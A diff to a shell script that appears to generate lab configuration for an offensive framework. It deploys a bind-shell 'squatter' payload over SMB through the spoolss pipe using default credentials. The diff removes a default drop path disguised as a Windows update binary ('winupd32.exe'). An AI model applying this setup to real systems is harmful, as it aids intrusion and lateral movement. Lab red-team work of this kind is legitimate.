@@ -11,7 +11,7 @@ transport="${HOVEL_SQUATTER_TYPE:-tcp-bind}"
 bind_port="${HOVEL_SQUATTER_BIND_PORT:-9101}"
 pipe_name="${HOVEL_SQUATTER_PIPE:-squatter}"
 pipe_path="\\\\.\\pipe\\${pipe_name}"
-remote_path="${HOVEL_SQUATTER_REMOTE_PATH:-C:\\Windows\\Temp\\winupd32.exe}"
+remote_path="${HOVEL_SQUATTER_REMOTE_PATH:-}"
 smb_user="${HOVEL_SMB_USER:-user}"
 smb_password="${HOVEL_SMB_PASSWORD:-password}"
 smb_domain="${HOVEL_SMB_DOMAIN:-}"
@@ -20,6 +20,13 @@ chain_file="$workspace/lab/etro-squatter-${transport}.chain.yaml"
 forceguest_chain="$workspace/lab/etro-forceguest.chain.yaml"
 
 mkdir -p "$(dirname "$chain_file")"
+
+remote_chain_config=""
+remote_target_config=""
+if [[ -n "$remote_path" ]]; then
+  remote_chain_config="    squatter.remote_path: '$remote_path'"
+  remote_target_config="        payload.remote_path: '$remote_path'"
+fi
 
 generate_named_pipe_payload() {
   local out="$workspace/lab/squatter-${pipe_name}.exe"
@@ -94,7 +101,7 @@ spec:
     operator.confirmed_lab: "true"
     squatter.type: "$transport"
     squatter.bind_port: "$bind_port"
-    squatter.remote_path: '$remote_path'
+$remote_chain_config
   targets:
     - id: "$target_id"
       config:
@@ -103,7 +110,7 @@ spec:
         pipe: "spoolss"
         payload.transport: "$transport"
         payload.local_path: "$squatter_payload"
-        payload.remote_path: '$remote_path'
+$remote_target_config
         payload.bind_port: "$bind_port"
         payload.pipe: '$pipe_path'
         smb.username: "$smb_user"
